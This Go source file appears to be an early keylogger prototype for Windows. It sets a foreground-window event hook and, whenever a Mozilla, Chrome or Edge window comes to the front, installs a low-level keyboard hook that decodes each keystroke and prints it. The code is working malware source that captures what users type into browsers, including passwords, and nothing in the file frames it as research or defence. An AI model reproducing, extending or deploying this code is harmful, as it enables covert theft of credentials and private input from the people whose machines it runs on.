package main

import (
	"fmt"
	"os"
	"strings"
	"unsafe"

	"github.com/MShoaei/Pineapple/windows"
)

var kbdHook windows.HHOOK

func main() {
	windows.Test()
	fmt.Println("test passed")
	// kbdHook := windows.SetWindowsHookExA(13, logger, 0, 0)
	wndHook := windows.SetWinEventHook(windows.EVENT_SYSTEM_FOREGROUND, windows.EVENT_SYSTEM_FOREGROUND, 0, windowLogger, 0, 0, windows.WINEVENT_SKIPOWNPROCESS)
	fmt.Println(kbdHook, wndHook)

	msg := windows.MSG{}
	for bRet := windows.GetMessageW(&msg, 0, 0, 0); bRet != 0; bRet = windows.GetMessageW(&msg, 0, 0, 0) {
		if bRet == -1 {
			fmt.Println("encountered an error")
			windows.UnhookWindowsHookEx(kbdHook)
			os.Exit(-1)
		}
	}
	os.Exit(int(msg.WParam))
}

func logger(nCode int, wParam windows.WPARAM, lParam uintptr) windows.LRESULT {

	//WM_KEYDOWN 0x100
	if nCode == 0 && wParam == 0x100 {
		var (
			hkl         windows.HKL
			dwThreadId  windows.DWORD
			dwProcessId windows.DWORD
		)
		pwszBuff := make([]uint16, 4)
		kState := make([]byte, 256)
		key := (*windows.KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam))
		hWindowHandle := windows.GetForegroundWindow()
		dwThreadId = windows.DWORD(windows.GetWindowThreadProcessID(hWindowHandle, &dwProcessId))

		windows.GetKeyboardState(&kState)
		hkl = windows.GetKeyboardLayout(dwThreadId)

		vKey := windows.MapVirtualKeyExW(windows.UINT(key.ScanCode), 3, hkl)
		windows.ToUnicodeEx(vKey, windows.UINT(key.ScanCode), &kState, &pwszBuff, 4, 0, hkl)
		fmt.Println(string(pwszBuff[0]))
	}

	return windows.CallNextHookEx(0, nCode, wParam, windows.LPARAM(lParam))
}

func windowLogger(hook windows.HWINEVENTHOOK, event windows.DWORD, hwnd windows.HWND, idObject windows.LONG, idChild windows.LONG, dwEventThread windows.DWORD, dwmsEventTime windows.DWORD) uintptr {
	if event == windows.EVENT_SYSTEM_FOREGROUND {
		title := windows.GetWindowTextW(hwnd)
		if strings.Contains(title, "Mozilla") || strings.Contains(title, "Chrome") || strings.Contains(title, "Edge") {
			fmt.Println(title)
			kbdHook = windows.SetWindowsHookExA(13, logger, 0, 0)
		} else {
			windows.UnhookWindowsHookEx(kbdHook)
		}
	}
	return 0
}
